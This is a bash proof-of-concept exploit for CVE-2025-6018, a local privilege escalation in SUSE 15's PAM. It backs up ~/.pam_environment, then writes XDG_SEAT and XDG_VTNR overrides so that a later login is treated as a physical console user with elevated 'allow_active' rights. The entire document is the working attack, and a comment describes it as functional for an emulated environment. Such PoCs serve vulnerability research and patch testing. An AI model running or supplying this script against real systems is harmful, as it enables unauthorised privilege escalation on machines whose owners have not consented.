#!/bin/bash
# PoC for CVE-2025-6018: LPE from unprivileged to allow_active in SUSE 15's PAM
# Fully functional for our emulated environment.
set -e

PAM_ENV="$HOME/.pam_environment"
BACKUP="$HOME/.pam_environment.bak"

if [ -f "$PAM_ENV" ]; then
    cp "$PAM_ENV" "$BACKUP"
    echo "Existing .pam_environment backed up to $BACKUP."
fi

# Write override values required to trick PAM into treating you as a physical user.
cat <<EOF > "$PAM_ENV"
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
EOF

echo ".pam_environment override applied."
echo "Log out and log back in for the new privileges to take effect."
exit 0